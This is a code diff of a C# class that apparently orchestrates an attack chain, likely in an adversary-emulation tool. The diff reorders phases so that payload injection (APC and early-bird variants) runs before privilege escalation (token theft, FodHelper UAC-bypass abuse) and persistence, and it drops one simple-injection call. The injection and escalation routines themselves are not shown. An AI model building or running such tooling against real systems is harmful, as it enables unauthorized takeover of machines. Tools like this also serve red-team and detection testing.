@@ -27,31 +27,9 @@ public class ChainBehaviorService
             //LoggerService.Write($"[Chain] Session config written: {Paths.SessionConfigPath}");
         }
 
-        if (chain.PrivEsc is { } privEsc)
-        {
-            LoggerService.Write($"[Chain] Phase 1 - PrivEsc: {privEsc.Behavior}");
-            switch (privEsc.Behavior)
-            {
-                case "TokenTheft":
-                    var code1 = InteropPrivilegeEscalation.TokenTheftEscalation(privEsc.TargetPid ?? 0);
-                    LoggerService.Write($"[Chain] TokenTheft result: {code1}");
-                    break;
-                case "FodHelperAbuse":
-                    Console.WriteLine($"[Chain] FodHelperAbuse command: {privEsc.ExecPath}");
-                    var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath);
-                    LoggerService.Write($"[Chain] FodHelperAbuse result: {code2}");
-                    break;
-            }
-        }
-
-        if (chain.Persistence is { } persistence)
-        {
-            LoggerService.Write($"[Chain] Phase 2 - Persistence: {persistence.Behavior} (service: {persistence.ServiceName})");
-        }
-
         if (chain.Injection is { } injection)
         {
-            LoggerService.Write($"[Chain] Phase 3 - Injection: {injection.Behavior}");
+            LoggerService.Write($"[Chain] Phase 1 - Injection: {injection.Behavior}");
             var payload = await PayloadService.GetPayload(injection.PayloadName);
             switch (injection.Behavior)
             {
@@ -65,8 +43,6 @@ public class ChainBehaviorService
                         PayloadPath = injection.PayloadName
                     };
                     await WriteBehaviorContext(context);
-                    var code3 = InteropInjection.InjectPayloadSimple(injection.TargetPid ?? 0, payload, (uint)payload.Length);
-                    LoggerService.Write($"[Chain] Simple injection result: {code3}");
                     break;
                 case "Apc-MultiThreaded":
                     var code4 = InteropInjection.InjectPayloadApcMultiThreaded(injection.TargetPid ?? 0, payload, (nuint)payload.Length);
@@ -86,6 +62,28 @@ public class ChainBehaviorService
                     LoggerService.Write($"[Chain] APC early bird injection result: {code5}");
                     break;
             }
+        }
+
+        if (chain.PrivEsc is { } privEsc)
+        {
+            LoggerService.Write($"[Chain] Phase 2 - PrivEsc: {privEsc.Behavior}");
+            switch (privEsc.Behavior)
+            {
+                case "TokenTheft":
+                    var code1 = InteropPrivilegeEscalation.TokenTheftEscalation(privEsc.TargetPid ?? 0);
+                    LoggerService.Write($"[Chain] TokenTheft result: {code1}");
+                    break;
+                case "FodHelperAbuse":
+                    Console.WriteLine($"[Chain] FodHelperAbuse command: {privEsc.ExecPath}");
+                    var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath);
+                    LoggerService.Write($"[Chain] FodHelperAbuse result: {code2}");
+                    break;
+            }
+        }
+
+        if (chain.Persistence is { } persistence)
+        {
+            LoggerService.Write($"[Chain] Phase 3 - Persistence: {persistence.Behavior} (service: {persistence.ServiceName})");
         }
     }
 
